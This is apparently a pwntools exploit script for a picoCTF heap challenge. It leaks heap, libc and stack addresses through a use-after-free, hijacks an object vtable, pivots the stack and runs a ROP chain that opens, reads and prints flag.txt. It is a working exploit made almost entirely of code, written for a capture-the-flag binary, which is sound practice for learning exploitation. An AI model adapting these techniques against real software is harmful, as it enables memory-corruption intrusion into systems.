#!/usr/bin/python3

from pwn import *

elf = ELF('./chall')
libc = ELF("./libc.so.6")

context.arch = elf.arch
context.binary = elf
context.terminal = ["terminator", "-u", "-e"]

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			# "breakrva 0x11ee chall", # jmp rax
			# "breakrva 0x13EE chall", # 
			# "breakrva 0x134D chall", # study
			# "breakrva 0x134F chall", # study
			"c"
		]), env=env)
	elif args.REMOTE2:
		return remote("10.0.3.155", 5000)
	elif args.REMOTE:
		return remote("mars.picoctf.net", 31638)
	else:
		return process(elf.path, env=env)

env={
	# "LD_LIBRARY_PATH": "./lib"
}
p = get_conn(env=env)
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
lw = lambda s: log.warn(s)
ls = lambda s: log.success(s)
cl = lambda: p.clean(timeout=1)


def alloc(idx, virtual=0):
	li(f"Create student {idx}")
	sla(b'choice:', b'0 ' + str(idx).encode())
	sla(b'virtual', str(virtual).encode()) 

def set_name(idx, name):
	li(f"Setting name of {idx}={name}")
	sla(b'choice:', b'1 ' + str(idx).encode() + b' ' + str(len(name)).encode())
	sl(b' '.join(map(lambda v: str(int(v)).encode(), name)))

def print_name(idx):
	sla(b'choice:', b'2 ' + str(idx).encode())
	rl()
	return rl()

def study(idx):
	li(f'Study {idx}')
	sa(b'choice:', b'3 ' + str(idx).encode())

def free(idx):
	li(f"Freeing {idx}")
	sla(b'choice:', b'4 ' + str(idx).encode())

# leak heap
alloc(0)
set_name(0, b'')
heap_leak = print_name(0)
heap_leak = u64(heap_leak.ljust(8, b'\x00'))
ls(f"Heap leak: {hex(heap_leak)}")

heap_base = heap_leak - 0x13e90
ls(f"Heap base: {hex(heap_base)}")

"""
0x55dc403fde60	0x0000000000000000	0x0000000000000081	................	 <-- smallbins[0x80][0]
0x55dc403fde70	0x00007f0defd4cd10	0x00007f0defd4cd10	................
"""

# leak libc
smallbin80 = heap_base + 0x11e70
alloc(1)
alloc(2)
free(1)
set_name(2, p64(0) + p64(smallbin80) + p64(1337))

libc_leak = print_name(1)
libc_leak = u64(libc_leak.ljust(8, b'\x00'))
ls(f"libc leak: {hex(libc_leak)}")

libc_base = libc_leak - 0x3ebd10
ls(f"libc base: {hex(libc_base)}")

libc.address = libc_base
libc_environ = libc.symbols.environ
ls(f'libc environ: {hex(libc_environ)}')

# leak stack
set_name(2, p64(0) + p64(libc_environ) + p64(1337))
libc_stack = print_name(1)
libc_stack = u64(libc_stack.ljust(8, b'\x00'))
ls(f"stack leak: {hex(libc_stack)}")

# main retaddr
main_retaddr = libc_stack- 0x108 - 0x40 + 0x18
# main_retaddr = libc_stack- 0x130
ls(f"main retaddr: {hex(main_retaddr)}")

# code execution
alloc(3)
alloc(4)
free(3)

# setup vtable
set_name(2, p64(0) + p64(libc.symbols.gets) + p64(0x13371337))

# set vtable of third student to ^
set_name(4, p64(heap_base + 0x13e98) + p64(0) + p64(0x1000))

alloc(5)
alloc(6)
alloc(7)
alloc(8)
alloc(9)

study(3)
sl(b'A' * 0x10 + p64(0) + p64(0x21) + p64(main_retaddr))

stack_pivot = ROP(libc, main_retaddr)
stack_pivot.raw(libc.address + 0x00000000000d11f5) # 0x00000000000d11f5 : pop rsp ; and al, 0xf0 ; movsd xmm0, qword ptr [rsp - 0x10] ; ret
stack_pivot.raw(heap_base + 0x12dd0 + 0x10) # offset to the rop below

syscall_ret = libc.address + 0x00000000000d2625 # 0x00000000000d2625: syscall; ret; 
rop = ROP(libc, heap_base + 0x12dd0) # offset to chunk 5 name (rop)
rop.raw(b'flag.txt' + p8(0) * 8)

rop.rdi = heap_base + 0x12dd0
rop.rsi = 0
rop.rax = 2
rop.raw(syscall_ret)

store_addr = libc.bss(0x20)

rop.rdi = 3
rop.rsi = store_addr
rop.rdx = 0x40
rop.rax = 0
rop.raw(syscall_ret)

# print rax
# addr = heap_base + 0x12dd0
# rop.rsi = addr
# rop.raw(libc.address + 0x00000000000898fa) # 0x00000000000898fa : mov qword ptr [rsi], rax ; xor eax, eax ; ret

rop.rdi = constants.STDOUT_FILENO
rop.rsi = store_addr
rop.rdx = 0x40
rop.rax = 1
rop.raw(syscall_ret)

rop.rax = 0x3c
rop.rdi = 0
rop.raw(syscall_ret)


print(rop.dump())
# print(len(rop.chain()))

# read = 0
# write = 1
# open = 2

set_name(5, rop.chain().ljust(512, b'\x00'))
alloc(14)
set_name(14, stack_pivot.chain())

ia()

